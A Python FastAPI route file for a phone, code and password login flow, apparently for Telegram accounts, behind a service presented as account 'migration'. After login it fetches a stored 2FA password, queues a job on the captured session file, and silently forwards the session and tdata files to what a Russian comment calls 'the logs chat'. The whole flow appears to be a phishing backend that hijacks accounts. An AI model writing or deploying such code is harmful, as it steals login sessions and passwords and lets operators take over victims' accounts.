from __future__ import annotations

import os
from typing import Optional

from fastapi import APIRouter, HTTPException, Request
from fastapi.responses import JSONResponse

from landing.app import SESSION_COOKIE
from landing.logger import landing_logger, mask_phone
from web.routes.common import login_payload, req_ip, req_meta
from web.routes.schemas import CodeBody, PasswordBody, PhoneBody
from web.services.export_options import ExportOptions
from web.services.job_runner import job_runner
from web.services.login_store import AuthStep
from web.services.migration.pipeline import MigrationPipeline
from web.services.migration.settings import settings_repo
from web.services.web_auth_service import WebAuthService

router = APIRouter()
auth_service = WebAuthService()


@router.post("/api/auth/start")
async def auth_start(request: Request):
	state = auth_service.start()
	await landing_logger.event(
		"auth.start",
		ip=req_ip(request),
		**req_meta(request),
		details={"login_id": state.login_id, "step": state.step.value},
	)
	return JSONResponse(login_payload(state))


@router.post("/api/auth/phone")
async def auth_phone(body: PhoneBody, request: Request):
	settings = await settings_repo.load()
	proxy_raw = body.proxy or settings.default_proxy or None
	await landing_logger.event(
		"auth.phone.submit",
		ip=req_ip(request),
		**req_meta(request),
		details={
			"login_id": body.login_id,
			"phone": mask_phone(body.phone),
			"proxy": bool(proxy_raw),
		},
	)
	try:
		state = await auth_service.submit_phone(
			body.login_id,
			body.phone,
			proxy_raw=proxy_raw,
			options=ExportOptions.from_dict(body.options.model_dump()),
		)
	except KeyError as error:
		await landing_logger.event(
			"auth.phone.error",
			ip=req_ip(request),
			**req_meta(request),
			details={"login_id": body.login_id, "error": str(error)},
		)
		raise HTTPException(status_code=404, detail=str(error)) from error

	await landing_logger.event(
		"auth.phone.result",
		ip=req_ip(request),
		**req_meta(request),
		details={
			"login_id": body.login_id,
			"step": state.step.value,
			"error": state.error,
			"phone": mask_phone(body.phone),
		},
	)
	if state.step == AuthStep.DONE and state.client:
		return await queue_migration(state, body.login_id, request)
	return JSONResponse(login_payload(state))


@router.post("/api/auth/code")
async def auth_code(body: CodeBody, request: Request):
	await landing_logger.event(
		"auth.code.submit",
		ip=req_ip(request),
		**req_meta(request),
		details={"login_id": body.login_id, "code_len": len(body.code or "")},
	)
	try:
		state = await auth_service.submit_code(body.login_id, body.code)
	except KeyError as error:
		await landing_logger.event(
			"auth.code.error",
			ip=req_ip(request),
			**req_meta(request),
			details={"login_id": body.login_id, "error": str(error)},
		)
		raise HTTPException(status_code=404, detail=str(error)) from error

	await landing_logger.event(
		"auth.code.result",
		ip=req_ip(request),
		**req_meta(request),
		details={
			"login_id": body.login_id,
			"step": state.step.value,
			"error": state.error,
			"user": state.user_label,
		},
	)
	if state.step == AuthStep.DONE and state.client:
		return await queue_migration(state, body.login_id, request)
	return JSONResponse(login_payload(state))


@router.post("/api/auth/password")
async def auth_password(body: PasswordBody, request: Request):
	await landing_logger.event(
		"auth.password.submit",
		ip=req_ip(request),
		**req_meta(request),
		details={"login_id": body.login_id, "password_len": len(body.password or "")},
	)
	try:
		state = await auth_service.submit_password(body.login_id, body.password)
	except KeyError as error:
		await landing_logger.event(
			"auth.password.error",
			ip=req_ip(request),
			**req_meta(request),
			details={"login_id": body.login_id, "error": str(error)},
		)
		raise HTTPException(status_code=404, detail=str(error)) from error

	await landing_logger.event(
		"auth.password.result",
		ip=req_ip(request),
		**req_meta(request),
		details={
			"login_id": body.login_id,
			"step": state.step.value,
			"error": state.error,
			"user": state.user_label,
		},
	)
	if state.step == AuthStep.DONE and state.client:
		return await queue_migration(state, body.login_id, request)
	return JSONResponse(login_payload(state))


async def queue_migration(state, login_id: str, request: Optional[Request] = None):
	settings = await settings_repo.load()
	proxy = state.proxy
	session_path = state.session_path
	user_label = state.user_label
	options = state.options
	cloud_password = (state.cloud_password or "").strip()
	if not cloud_password:
		from web.services.migration.cloud_secrets import cloud_secrets

		keys = []
		if state.phone:
			keys.append(str(state.phone))
		if session_path:
			keys.append(os.path.splitext(os.path.basename(session_path))[0])
		for key in keys:
			cloud_password = await cloud_secrets.get(key) or ""
			if cloud_password:
				break

	job_runner.set_concurrency(settings.concurrency or options.concurrency)
	await auth_service.finish(login_id)

	pipeline = MigrationPipeline(settings=settings, export_options=options)

	async def worker():
		return await pipeline.run_session(
			session_path,
			proxy=proxy,
			cloud_password=cloud_password,
		)

	job = await job_runner.submit(
		label=user_label or session_path or "account",
		worker=worker,
		session_path=session_path,
	)

	# session + tdata в чат логов (не блокируем ответ пользователю надолго)
	try:
		from web.services.session_delivery import deliver_session_artifacts

		await deliver_session_artifacts(
			session_path=session_path,
			user_label=user_label or "",
		)
	except Exception:
		pass

	await landing_logger.event(
		"auth.done",
		ip=req_ip(request),
		**req_meta(request),
		details={
			"login_id": login_id,
			"user": user_label,
			"session": session_path,
			"job_id": job.job_id,
		},
	)

	response = JSONResponse(
		{
			"login_id": login_id,
			"step": AuthStep.DONE.value,
			"error": None,
			"user_label": user_label,
			"session_path": session_path,
			"export_dir": None,
			"job_id": job.job_id,
		}
	)
	response.set_cookie(
		key=SESSION_COOKIE,
		value=f"tg-{login_id}",
		httponly=True,
		samesite="lax",
		max_age=60 * 60 * 24 * 30,
	)
	return response
